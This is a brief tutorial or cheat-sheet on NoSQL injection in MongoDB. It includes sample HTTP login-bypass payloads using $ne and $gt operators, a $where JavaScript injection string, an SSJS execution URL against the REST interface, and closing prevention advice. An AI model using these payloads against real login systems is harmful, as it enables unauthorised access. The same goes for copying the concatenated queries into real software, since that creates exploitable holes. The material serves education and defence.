# NoSQL Injection

> Shukla Ji:
>
> > "Apparently, MongoDB and many of the NoSQL databases are nothing more than JavaScript processing engines."
> 

## Links

- https://medium.com/@shukla.iitm/nosql-injection-8732c2140576
- https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- http://blog.ptsecurity.com/2012/11/attacking-mongodb_26.html

## Concept

NoSQL queries can be as insecure as SQL queries. Developer might be concatenating the values.

Sample bad query: `db.accounts.find({username: username, password: password});`

This can be hacked just by sending any of these two requests:

```HTTP
POST /login HTTP/1.1
Host: example.org
```

JSON request

```HTTP
Content-Type: application/json
Content-Length: 38

{
“username”: “admin”,
“Password”: {'$gt': “”}
}
```

NON-JOSN request

```HTTP
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

user=admin&password[%24ne]=
```

Another vulnerable query

`db.articles.find({“$where”: “this.hidden == false && this.category == ‘“+category+”’” });`

This can be exploited by passing `; return '' === ''`.

## MongoDB query operators

| \$      | escaped    |                                             |
| ------- | ---------- | ------------------------------------------- |
| \$ne    | [%24ne]    | not equal                                   |
| \$gt    | [%24gt]    | greater than                                |
| \$regex | [%24regex] | you can use regular expressions             |
| \$where | [%24where] | you can pass a script to filter the results |

## MongoDB operations that permit arbitrary javascript execution

- $where
- mapReduce
- group

You can disable it by passing `--noscripting` on the command line; or by setting `security.javascriptEnabled` in configuration file.

## Attacking MongoDB

SSJS code execution via `http://vuln-host:28017/admin/$cmd/?filter_eval=function(){ return db.version() }&limit=1`

`?login=admin&password[$ne]=1` is how you pass login = `"admin"` and password = `{ $ne: "1" }`.

## Preventing NoSQL injection

- Use stored procedures or stored functions or stored queries equivalent.
- Don't concatenate user input to form queries.
- Proper access management
  - Application accounts should not have admin rights.
  - Execute queries with lowest privileges possible.
- Use existing libraries instead of coming up with your own drivers and other implementations.
